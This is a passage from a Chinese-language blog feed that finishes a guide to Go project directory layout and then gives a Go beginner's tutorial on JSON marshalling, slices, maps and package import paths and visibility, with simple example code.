title="/deployments"></a><code>/deployments</code></h3><p>IaaS，PaaS，系统和容器编排部署配置和模板（docker-compose，kubernetes&#x2F;helm，mesos，terraform，bosh）。请注意，在某些存储库中（尤其是使用kubernetes部署的应用程序），该目录的名字是<code>/deploy</code>。</p><h3 id="test"><a href="#test" class="headerlink" title="/test"></a><code>/test</code></h3><p>外部测试应用程序和测试数据。随时根据需要构建<code>/test</code>目录。对于较大的项目，有一个数据子目录更好一些。例如，如果需要Go忽略目录中的内容，则可以使用<code>/test/data</code>或<code>/test/testdata</code>这样的目录名字。请注意，Go还将忽略以“<code>.</code>”或“<code>_</code>”开头的目录或文件，因此可以更具灵活性的来命名测试数据目录。</p><p>更多样例查看<a href="https://github.com/golang-standards/project-layout/blob/master/test/README.md"><code>/test</code></a>。</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="docs"><a href="#docs" class="headerlink" title="/docs"></a><code>/docs</code></h3><p>设计和用户文档（除了godoc生成的文档）。</p><p>更多样例查看<a href="https://github.com/golang-standards/project-layout/blob/master/docs/README.md"><code>/docs</code></a>。</p><h3 id="tools"><a href="#tools" class="headerlink" title="/tools"></a><code>/tools</code></h3><p>此项目的支持工具。请注意，这些工具可以从<code>/pkg</code>和<code>/internal</code>目录导入代码。</p><p>更多样例查看<a href="https://github.com/golang-standards/project-layout/blob/master/tools/README.md"><code>/tools</code></a>。</p><h3 id="examples"><a href="#examples" class="headerlink" title="/examples"></a><code>/examples</code></h3><p>应用程序或公共库的示例。</p><p>更多样例查看<a href="https://github.com/golang-standards/project-layout/blob/master/examples/README.md"><code>/examples</code></a>。</p><h3 id="third-party"><a href="#third-party" class="headerlink" title="/third_party"></a><code>/third_party</code></h3><p>外部辅助工具，fork的代码和其他第三方工具（例如Swagger UI）。</p><h3 id="githooks"><a href="#githooks" class="headerlink" title="/githooks"></a><code>/githooks</code></h3><p>Git的钩子。</p><h3 id="assets"><a href="#assets" class="headerlink" title="/assets"></a><code>/assets</code></h3><p>项目中使用的其他资源（图像，Logo等）。</p><h3 id="website"><a href="#website" class="headerlink" title="/website"></a><code>/website</code></h3><p>如果不使用Github pages，则在这里放置项目的网站数据。</p><p>更多样例查看<a href="https://github.com/golang-standards/project-layout/blob/master/website/README.md"><code>/website</code></a>。</p><h2 id="不应该出现的目录"><a href="#不应该出现的目录" class="headerlink" title="不应该出现的目录"></a>不应该出现的目录</h2><h3 id="src"><a href="#src" class="headerlink" title="/src"></a><code>/src</code></h3><p>有一些Go项目确实包含<code>src</code>文件夹，但通常只有在开发者是从Java（这是Java中一个通用的模式）转过来的情况下才会有。如果可以的话请不要使用这种Java模式。你肯定不希望你的Go代码和项目看起来像Java。</p><p>不要将项目级别的<code>/src</code>目录与Go用于其工作空间的<code>/src</code>目录混淆，就像<a href="https://golang.org/doc/code.html">How to Write Go Code</a>中描述的那样。<code>$GOPATH</code>环境变量指向当前的工作空间（默认情况下指向非Windows系统中的<code>$HOME/go</code>）。此工作空间包括顶级<code>/pkg</code>，<code>/bin</code>和<code>/src</code>目录。实际的项目最终变成<code>/src</code>下的子目录，因此，如果项目中有<code>/src</code>目录，则项目路径将会变成：<code>/some/path/to/workspace/src/your_project/src/your_code.go</code>。请注意，使用Go 1.11，可以将项目放在GOPATH之外，但这并不意味着使用此布局模式是个好主意。</p><h2 id="徽章"><a href="#徽章" class="headerlink" title="徽章"></a>徽章</h2><ul><li><a href="https://goreportcard.com/">Go Report Card</a>：它将使用<code>gofmt</code>，<code>vet</code>，<code>gocyclo</code>，<code>golint</code>，<code>ineffassign</code>，<code>license</code>和<code>mispell</code>扫描项目中的代码。将<code>github.com/golang-standards/project-layout</code>替换为你的项目的引用。</li><li><a href="http://godoc.org/">GoDoc</a>：它将提供GoDoc生成的文档的在线版本。更改链接以指向你的项目。</li><li>Release：它将显示你项目的最新版本号。更改github链接以指向你的项目。</li></ul><p><a href="https://goreportcard.com/report/github.com/golang-standards/project-layout"><img src="https://goreportcard.com/badge/github.com/golang-standards/project-layout?style=flat-square" alt="Go Report Card"></a><br><a href="http://godoc.org/github.com/golang-standards/project-layout"><img src="https://img.shields.io/badge/godoc-reference-blue.svg?style=flat-square" alt="Go Doc"></a><br><a href="https://github.com/golang-standards/project-layout/releases/latest"><img src="https://img.shields.io/github/release/golang-standards/project-layout.svg?style=flat-square" alt="Release"></a></p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>WIP项目是一个自以为是的项目模板其中带有<code>sample/reusable</code>配置、脚本和代码。</p>]]></content:encoded>
      
      
      <category domain="https://cjliblog.top/categories/go/">go</category>
      
      
      
      <comments>https://cjliblog.top/2023/12/13/GO%E8%AF%AD%E8%A8%80%E5%B8%83%E5%B1%80-%E4%B8%AD%E6%96%87%E7%89%88/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>go的入门</title>
      <link>https://cjliblog.top/2023/12/13/go%E7%9A%84%E5%85%A5%E9%97%A8/</link>
      <guid>https://cjliblog.top/2023/12/13/go%E7%9A%84%E5%85%A5%E9%97%A8/</guid>
      <pubDate>Tue, 12 Dec 2023 16:00:00 GMT</pubDate>
      
      <description>大家好，我是description</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="大纲"><a href="#大纲" class="headerlink" title="大纲"></a>大纲</h1><h3 id="初学者阶段"><a href="#初学者阶段" class="headerlink" title="初学者阶段"></a>初学者阶段</h3><ol><li><p><strong>基本语法和概念</strong></p><ul><li>变量、数据类型（比如整型、字符串）</li><li>控制结构（if、for循环）</li><li>函数的定义和调用</li><li>错误处理（error 类型）</li></ul></li><li><p><strong>基本的数据结构</strong></p><ul><li>数组和切片</li><li>映射（map）</li><li>结构体（struct）</li></ul></li><li><p><strong>包（Package）的使用</strong></p><ul><li>导入标准库包</li><li>创建自己的包</li><li>理解包的导入路径和可见性</li></ul></li><li><p><strong>简单的程序编写</strong></p><ul><li>编写小程序，如计算器、简单的文件操作等</li></ul></li><li><p><strong>工具和环境</strong></p><ul><li>Go 工具链（如 go build, go run）</li><li>理解 GOPATH 和模块</li></ul></li></ol><h3 id="进阶阶段"><a href="#进阶阶段" class="headerlink" title="进阶阶段"></a>进阶阶段</h3><ol><li><p><strong>并发编程</strong></p><ul><li>协程（goroutine）</li><li>通道（channel）</li><li>sync 包的使用（如 WaitGroup）</li></ul></li><li><p><strong>更复杂的数据结构</strong></p><ul><li>接口（interface）</li><li>切片和映射的高级用法</li><li>使用指针</li></ul></li><li><p><strong>错误处理和测试</strong></p><ul><li>深入理解 error 接口</li><li>编写单元测试（testing 包）</li><li>基准测试（benchmark）</li></ul></li><li><p><strong>网络编程</strong></p><ul><li>HTTP 服务器和客户端</li><li>使用 TCP&#x2F;UDP</li></ul></li><li><p><strong>项目结构和设计模式</strong></p><ul><li>组织大型 Go 项目</li><li>掌握常用设计模式</li></ul></li></ol><h3 id="高级阶段"><a href="#高级阶段" class="headerlink" title="高级阶段"></a>高级阶段</h3><ol><li><p><strong>性能优化</strong></p><ul><li>分析和优化性能（pprof）</li><li>内存管理和垃圾回收</li><li>并发模式和优化</li></ul></li><li><p><strong>微服务和容器化</strong></p><ul><li>使用 Docker 容器化 Go 应用</li><li>了解微服务架构</li></ul></li><li><p><strong>云原生和 DevOps</strong></p><ul><li>Kubernetes 与 Go</li><li>CI&#x2F;CD 流程</li></ul></li><li><p><strong>高级网络编程</strong></p><ul><li>深入理解网络协议</li><li>构建复杂的网络应用</li></ul></li><li><p><strong>贡献开源项目</strong></p><ul><li>理解开源文化</li><li>参与 Go 相关的开源项目</li></ul></li></ol><h1 id="结构体实例和json的转换"><a href="#结构体实例和json的转换" class="headerlink" title="结构体实例和json的转换"></a>结构体实例和json的转换</h1><ol><li><p><strong>定义结构体</strong>：首先是你提供的 <code>TODO</code> 结构体。</p> <figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> TODO <span class="keyword">struct</span> &#123;</span><br><span class="line">    ID      <span class="type">int</span>    <span class="string">`json:&quot;id&quot;`</span></span><br><span class="line">    Content <span class="type">string</span> <span class="string">`json:&quot;content&quot;`</span></span><br><span class="line">    Done    <span class="type">bool</span>   <span class="string">`json:&quot;done&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>序列化（Struct 到 JSON）</strong>：将一个 <code>TODO</code> 结构体的实例转换成JSON字符串。</p> <figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;encoding/json&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 创建一个TODO实例</span></span><br><span class="line">    todo := TODO&#123;ID: <span class="number">1</span>, Content: <span class="string">&quot;买菜&quot;</span>, Done: <span class="literal">false</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将TODO实例转换为JSON格式</span></span><br><span class="line">    jsonData, err := json.Marshal(todo)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatalf(<span class="string">&quot;Error occurred during marshaling. Error: %s&quot;</span>, err.Error())</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(<span class="type">string</span>(jsonData))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>反序列化（JSON 到 Struct）</strong>：将一个JSON字符串解析成 <code>TODO</code> 结构体的实例。</p> <figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// JSON字符串</span></span><br><span class="line">    jsonString := <span class="string">`&#123;&quot;id&quot;:1, &quot;content&quot;:&quot;买菜&quot;, &quot;done&quot;:false&#125;`</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将JSON字符串解析到TODO结构体</span></span><br><span class="line">    <span class="keyword">var</span> todo TODO</span><br><span class="line">    err := json.Unmarshal([]<span class="type">byte</span>(jsonString), &amp;todo)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatalf(<span class="string">&quot;Error occurred during unmarshaling. Error: %s&quot;</span>, err.Error())</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fmt.Printf(<span class="string">&quot;%+v\n&quot;</span>, todo)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="解释："><a href="#解释：" class="headerlink" title="解释："></a>解释：</h3><ul><li><p><strong>序列化</strong>：<code>json.Marshal</code> 函数用于将结构体转换为JSON字符串。它会自动根据结构体中定义的JSON标签进行转换。</p></li><li><p><strong>反序列化</strong>：<code>json.Unmarshal</code> 函数用于将JSON字符串解析为结构体。同样地，它会根据JSON标签来决定如何填充结构体的字段。</p></li></ul><p>这两个过程非常关键，尤其是在处理Web API或数据存储时。通过这种方式，Go语言能够方便地处理JSON数据，让你的编程之旅更加顺畅！</p><p>试试看运行这些代码，看看结果如何！如果有任何疑问，或者想要探讨更多，随时告诉我哦！ 😊👨‍💻🚀</p><p>好问题！解释一下这个 <code>json.Unmarshal([]byte(jsonString), &amp;todo)</code> 语句，我们可以分两部分来看：</p><ol><li><p><code>[]byte(jsonString)</code>：</p><ul><li>这里，我们把字符串 <code>jsonString</code> 转换成了一个字节切片（<code>[]byte</code>）。</li><li>为什么要这么做呢？因为 <code>json.Unmarshal</code> 函数需要一个字节切片作为输入。在Go语言中，JSON数据通常以字节形式处理，这样可以更高效，特别是处理大量数据时。</li><li>简单来说，<code>[]byte(jsonString)</code> 就是把JSON格式的字符串转换成了Go能够处理的字节格式。</li></ul></li><li><p><code>&amp;todo</code>：</p><ul><li>这里用到了取地址符号 <code>&amp;</code>，意味着我们传递给 <code>json.Unmarshal</code> 的是 <code>todo</code> 变量的地址，而不是它的值。</li><li>为什么要传递地址？因为 <code>json.Unmarshal</code> 需要在这个地址上直接修改数据。如果我们只传递值（即不用 <code>&amp;</code>），那么 <code>json.Unmarshal</code> 只能修改副本的数据，原始的 <code>todo</code> 变量则不会改变。</li><li>通过传递 <code>todo</code> 变量的地址，<code>json.Unmarshal</code> 能够直接在这个地址上更新 <code>todo</code> 的字段，这样我们就能得到解析后的数据了。</li></ul></li></ol><p>总结一下，<code>json.Unmarshal([]byte(jsonString), &amp;todo)</code> 这行代码的作用是：它把JSON字符串转换成字节切片，然后把这些字节解析成 <code>TODO</code> 结构体的数据，直接写入到 <code>todo</code> 变量中。这是Go语言处理JSON非常常用的一种方式，既高效又直接。</p><h1 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h1><p>在Go语言中，切片（Slice）是一种非常灵活且功能丰富的数据结构。切片提供了多种操作方法来处理动态序列。让我们一起来看看切片的常见操作吧：</p><h3 id="1-创建切片"><a href="#1-创建切片" class="headerlink" title="1. 创建切片"></a>1. 创建切片</h3><ul><li>使用 <code>make</code>：<code>make([]int, length, capacity)</code> 创建一个指定长度和容量的切片。</li><li>从数组或切片中创建：<code>array[start:end]</code> 从数组或另一个切片中创建切片。</li></ul><h3 id="2-添加元素"><a href="#2-添加元素" class="headerlink" title="2. 添加元素"></a>2. 添加元素</h3><ul><li><code>append</code>：<code>slice = append(slice, elem1, elem2)</code> 添加一个或多个元素到切片的末尾。</li></ul><h3 id="3-删除元素"><a href="#3-删除元素" class="headerlink" title="3. 删除元素"></a>3. 删除元素</h3><ul><li>删除指定位置的元素：使用 <code>append</code> 和切片操作组合来删除元素，例如 <code>append(slice[:i], slice[i+1:]...)</code>。</li></ul><h3 id="4-访问和修改元素"><a href="#4-访问和修改元素" class="headerlink" title="4. 访问和修改元素"></a>4. 访问和修改元素</h3><ul><li>通过索引：<code>slice[i]</code> 访问或修改第 <code>i</code> 个元素。</li></ul><h3 id="5-切片的长度和容量"><a href="#5-切片的长度和容量" class="headerlink" title="5. 切片的长度和容量"></a>5. 切片的长度和容量</h3><ul><li><code>len(slice)</code>：返回切片的当前长度。</li><li><code>cap(slice)</code>：返回切片的容量。</li></ul><h3 id="6-切片遍历"><a href="#6-切片遍历" class="headerlink" title="6. 切片遍历"></a>6. 切片遍历</h3><ul><li>使用 <code>for</code> 循环：<code>for i := range slice &#123; ... &#125;</code>。</li><li>使用 <code>for</code> 循环和索引：<code>for i, v := range slice &#123; ... &#125;</code>。</li></ul><h3 id="7-切片复制"><a href="#7-切片复制" class="headerlink" title="7. 切片复制"></a>7. 切片复制</h3><ul><li><code>copy</code>：<code>copy(destSlice, srcSlice)</code> 将一个切片的元素复制到另一个切片。</li></ul><h3 id="8-切片截取"><a href="#8-切片截取" class="headerlink" title="8. 切片截取"></a>8. 切片截取</h3><ul><li><code>slice[start:end]</code>：截取切片的一部分。</li></ul><h3 id="9-多维切片"><a href="#9-多维切片" class="headerlink" title="9. 多维切片"></a>9. 多维切片</h3><ul><li>像数组一样，你可以创建多维切片。</li></ul><h3 id="10-切片的排序"><a href="#10-切片的排序" class="headerlink" title="10. 切片的排序"></a>10. 切片的排序</h3><ul><li>使用 <code>sort</code> 包：<code>sort.Ints(slice)</code> 对整数切片排序。</li></ul><h3 id="11-清空切片"><a href="#11-清空切片" class="headerlink" title="11. 清空切片"></a>11. 清空切片</h3><ul><li>设置为 nil：<code>slice = nil</code> 清空切片。</li></ul><h3 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;sort&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 创建切片</span></span><br><span class="line">slice := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">0</span>, <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加元素</span></span><br><span class="line">slice = <span class="built_in">append</span>(slice, <span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 排序</span></span><br><span class="line">sort.Ints(slice)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历</span></span><br><span class="line"><span class="keyword">for</span> _, value := <span class="keyword">range</span> slice &#123;</span><br><span class="line">fmt.Println(value)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除第一个元素</span></span><br><span class="line">slice = slice[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 显示结果</span></span><br><span class="line">fmt.Println(slice)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-使用-interface-类型的切片"><a href="#1-使用-interface-类型的切片" class="headerlink" title="1. 使用 interface{} 类型的切片"></a>1. 使用 <code>interface&#123;&#125;</code> 类型的切片</h3><p>最通用的方法是使用 <code>interface&#123;&#125;</code> 类型的切片，因为在Go中，<code>interface&#123;&#125;</code> 可以表示任何类型的值。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mixedSlice []<span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">mixedSlice = <span class="built_in">append</span>(mixedSlice, <span class="string">&quot;Hello&quot;</span>, <span class="number">42</span>, <span class="literal">true</span>, <span class="number">3.14</span>)</span><br></pre></td></tr></table></figure><p>这种方式允许你将任何类型的数据添加到切片中，但在使用时需要注意类型断言，因为你需要明确知道你在处理什么类型的数据。</p><h3 id="2-使用结构体和方法"><a href="#2-使用结构体和方法" class="headerlink" title="2. 使用结构体和方法"></a>2. 使用结构体和方法</h3><p>如果你知道你想要存储的数据类型的范围，你可以定义一个结构体，这个结构体包含所有可能的类型，然后在切片中存储这个结构体的实例。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> MixedType <span class="keyword">struct</span> &#123;</span><br><span class="line">    intValue    <span class="type">int</span></span><br><span class="line">    stringValue <span class="type">string</span></span><br><span class="line">    boolValue   <span class="type">bool</span></span><br><span class="line">    <span class="comment">// 其他类型</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> mixedSlice []MixedType</span><br><span class="line">mixedSlice = <span class="built_in">append</span>(mixedSlice, MixedType&#123;intValue: <span class="number">1</span>&#125;, MixedType&#123;stringValue: <span class="string">&quot;Hello&quot;</span>&#125;)</span><br></pre></td></tr></table></figure><p>这种方法提供了更好的类型安全性，但牺牲了一些灵活性和便利性。</p><h3 id="3-使用第三方库"><a href="#3-使用第三方库" class="headerlink" title="3. 使用第三方库"></a>3. 使用第三方库</h3><p>还有一些第三方库提供了类似于动态类型数组的功能，但这通常不被推荐，除非你确实需要这种特殊的功能，并且愿意引入额外的依赖。</p><h3 id="使用-interface-切片的示例"><a href="#使用-interface-切片的示例" class="headerlink" title="使用 interface{} 切片的示例"></a>使用 <code>interface&#123;&#125;</code> 切片的示例</h3><p>这里有一个简单的示例，展示如何使用 <code>interface&#123;&#125;</code> 类型的切片：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;reflect&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 创建一个可以存储任何类型的切片</span></span><br><span class="line"><span class="keyword">var</span> mixedSlice []<span class="keyword">interface</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 向切片中添加不同类型的数据</span></span><br><span class="line">mixedSlice = <span class="built_in">append</span>(mixedSlice, <span class="string">&quot;Hello&quot;</span>, <span class="number">42</span>, <span class="literal">true</span>, <span class="number">3.14</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历切片并打印每个元素的类型和值</span></span><br><span class="line"><span class="keyword">for</span> _, v := <span class="keyword">range</span> mixedSlice &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;Type: %s, Value: %v\n&quot;</span>, reflect.TypeOf(v), v)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个示例展示了如何创建一个可以存储不同类型数据的切片，以及如何遍历这个切片并打印出每个元素的类型和值。使用 <code>interface&#123;&#125;</code> 类型的切片确实提供了灵活性，但也需要在使用时小心处理类型断言和类型检查。</p><p>总的来说，尽管Go语言不直接支持存储不同类型数据的切片，但你可以通过上述方法来实现类似的功能。然而，总是需要权衡灵活性和类型安全性。如果你有特定的使用场景，选择合适的方法很重要。</p><h1 id="映射"><a href="#映射" class="headerlink" title="映射"></a>映射</h1><p>当然可以！讲解映射（Map）这个概念，我们要从几个方面来理解：</p><h3 id="映射（Map）的基本概念"><a href="#映射（Map）的基本概念" class="headerlink" title="映射（Map）的基本概念"></a>映射（Map）的基本概念</h3><ol><li><p><strong>定义与特点</strong></p><ul><li>映射是一种键值对（Key-Value）的数据结构。</li><li>在 Go 里，映射的键可以是任何可比较的类型，比如 int、string。</li><li>值可以是任何类型，甚至可以是另一个映射。</li><li>映射是无序的，每次遍历映射时，键值对的顺序可能不同。</li></ul></li><li><p><strong>创建和初始化</strong></p><ul><li>使用内置的 <code>make</code> 函数：<code>mapVar := make(map[KeyType]ValueType)</code></li><li>字面量初始化：<code>mapVar := map[KeyType]ValueType&#123;key1: value1, key2: value2&#125;</code></li></ul></li><li><p><strong>操作</strong></p><ul><li><strong>添加&#x2F;修改元素</strong>：<code>mapVar[key] = value</code></li><li><strong>获取元素</strong>：<code>value := mapVar[key]</code></li><li><strong>删除元素</strong>：<code>delete(mapVar, key)</code></li><li><strong>检查键是否存在</strong>：<code>value, ok := mapVar[key]</code>（如果 key 存在，<code>ok</code> 为 <code>true</code>；否则，<code>ok</code> 为 <code>false</code>）</li></ul></li></ol><h3 id="映射的使用场景"><a href="#映射的使用场景" class="headerlink" title="映射的使用场景"></a>映射的使用场景</h3><ul><li><strong>存储唯一键的集合</strong>：比如用户名到用户信息的映射。</li><li><strong>快速查找</strong>：通过键可以迅速找到对应的值。</li><li><strong>作为集合的替代品</strong>：特别是需要键和值对应时。</li></ul><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li><strong>并发安全性</strong>：标准的 <code>map</code> 在并发情况下不是安全的。需要使用锁（如 <code>sync.Mutex</code>）或者使用 <code>sync.Map</code>。</li><li><strong>零值</strong>：访问不存在的键时，会得到值类型的零值，如 int 的零值是 0。</li><li><strong>迭代顺序</strong>：遍历 map 时，每次的迭代顺序可能不同，不能假设它们有序。</li></ul><h3 id="示例代码-1"><a href="#示例代码-1" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 创建一个映射</span></span><br><span class="line">    myMap := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 添加元素</span></span><br><span class="line">    myMap[<span class="string">&quot;apple&quot;</span>] = <span class="number">5</span></span><br><span class="line">    myMap[<span class="string">&quot;banana&quot;</span>] = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取并打印一个元素</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;apples:&quot;</span>, myMap[<span class="string">&quot;apple&quot;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查元素是否存在</span></span><br><span class="line">    value, ok := myMap[<span class="string">&quot;orange&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> ok &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;orange:&quot;</span>, value)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;orange not found&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除一个元素</span></span><br><span class="line">    <span class="built_in">delete</span>(myMap, <span class="string">&quot;apple&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历映射</span></span><br><span class="line">    <span class="keyword">for</span> key, value := <span class="keyword">range</span> myMap &#123;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;%s has %d items\n&quot;</span>, key, value)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="包"><a href="#包" class="headerlink" title="包"></a>包</h1><p>在 Go 语言中，理解包的导入路径和可见性是非常重要的。这不仅关系到如何组织代码，还影响着代码的可访问性和重用性。我们来逐一看看：</p><h3 id="包的导入路径"><a href="#包的导入路径" class="headerlink" title="包的导入路径"></a>包的导入路径</h3><ol><li><p><strong>定义</strong></p><ul><li>包的导入路径是用来在 Go 程序中引入包的路径。它可以是相对路径或绝对路径。</li></ul></li><li><p><strong>GOPATH 和 Go Modules</strong></p><ul><li>在 Go Modules 出现之前，Go 依赖于 <code>GOPATH</code> 环境变量来寻找项目和包。</li><li>Go 1.11 引入了 Go Modules，使得你可以在任何地方创建项目，不再受限于 <code>GOPATH</code>。</li><li>使用 Go Modules 时，包的导入路径通常是模块路径加上包的子路径。</li></ul></li><li><p><strong>模块路径</strong></p><ul><li>模块路径通常是版本控制仓库的路径（例如 <code>github.com/username/project</code>）。</li><li>在项目的根目录下的 <code>go.mod</code> 文件中声明模块路径。</li></ul></li></ol><h3 id="包的可见性"><a href="#包的可见性" class="headerlink" title="包的可见性"></a>包的可见性</h3><ol><li><p><strong>公开可见性（Exported）</strong></p><ul><li>在 Go 中，如果一个标识符（如函数、类型、变量等）的首字母是大写的，那么它就是公开的，可以被其他包访问。</li><li>例如，<code>Println</code> 是 <code>fmt</code> 包中的一个公开函数。</li></ul></li><li><p><strong>私有可见性（Unexported）</strong></p><ul><li>如果一个标识符的首字母是小写的，那么它是私有的，只能在其所在的包内部访问。</li><li>这对封装和隐藏实现细节非常重要。</li></ul></li></ol><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>假设我们有一个项目结构如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- /path/to/myproject</span><br><span class="line">  - go.mod (module github.com/myuser/myproject)</span><br><span class="line">  - main.go</span><br><span class="line">  - helper</span><br><span class="line">    - helper.go</span><br></pre></td></tr></table></figure><p>在这个结构中：</p><ul><li>导入路径：如果 <code>helper.go</code> 中定义了一个包 <code>package helper</code>，那么在 <code>main.go</code> 中导入它时的路径是 <code>github.com/myuser/myproject/helper</code>。</li><li>可见性：如果 <code>helper.go</code> 中定义了一个公开函数 <code>Func()</code>，则在 <code>main.go</code> 中可以访问它。如果是私有函数 <code>func()</code>，则不能。</li></ul><p>通过这样的机制，Go 语言实现了良好的代码组织、模块化和封装。理解这些概念对于编写清晰、易于维护的 Go 代码至关重要。💻📘</p><p>在 Go 语言中，当你使用像 <code>github.com/myuser/myproject/helper</code> 这样的导入路径时，你实际上是按照 Go 的包（package）导入机制来引入代码。这里，<code>github.com/myuser/myproject/helper</code> 并不是直接导入 GitHub 仓库中的代码，而是指定了一个本地环境中的包路径，这个路径通常与远程仓库的 URL 相对应。让我来详细解释一下：</p><h3 id="本地包导入"><a href="#本地包导入" class="headerlink" title="本地包导入"></a>本地包导入</h3><ol><li><p><strong>模块与包的关系</strong></p><ul><li>在 Go 中，一个模块是包含一个或多个包的集合。</li><li><code>go.mod</code> 文件定义了模块的根路径（例如 <code>github.com/myuser/myproject</code>）。</li><li>在此模块内，你可以有多个包，例如 <code>helper</code>。</li></ul></li><li><p><strong>导入机制</strong></p><ul><li>当你在代码中写 <code>import &quot;github.com/myuser/myproject/helper&quot;</code> 时，Go 会在本地环境中查找这个路径。</li><li>这通常意味着在你的项目目录（包含 <code>go.mod</code> 文件的地方）下应该有一个 <code>helper</code> 子目录。</li><li>这个 <code>helper</code> 子目录应该包含 Go 代码文件（如 <code>helper.go</code>），并且这些文件的包声明应该是 <code>package helper</code>。</li></ul></li></ol><h3 id="远程仓库与依赖管理"><a href="#远程仓库与依赖管理" class="headerlink" title="远程仓库与依赖管理"></a>远程仓库与依赖管理</h3><ol><li><p><strong>依赖获取</strong></p><ul><li>当你的项目依赖于 GitHub 上的其他项目时，例如 <code>import &quot;github.com/someuser/somelibrary&quot;</code>，Go 会使用 Go Modules（如果你的项目启用了它）来管理这些依赖。</li><li>这时，Go 会从远程仓库下载依赖到本地的模块缓存中，并在构建时使用这些依赖。</li></ul></li><li><p><strong>版本管理</strong></p><ul><li>Go Modules 允许你指定依赖的确切版本，例如在 <code>go.mod</code> 文件中。</li><li>这确保了项目构建的一致性，因为它会使用确定的依赖版本。</li></ul></li></ol><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><ul><li>所以，当你写 <code>import &quot;github.com/myuser/myproject/helper&quot;</code> 时，你实际上是引入了你本地项目内部的一个包，而不是直接从 GitHub 导入。</li><li>如果你的项目依赖于 GitHub 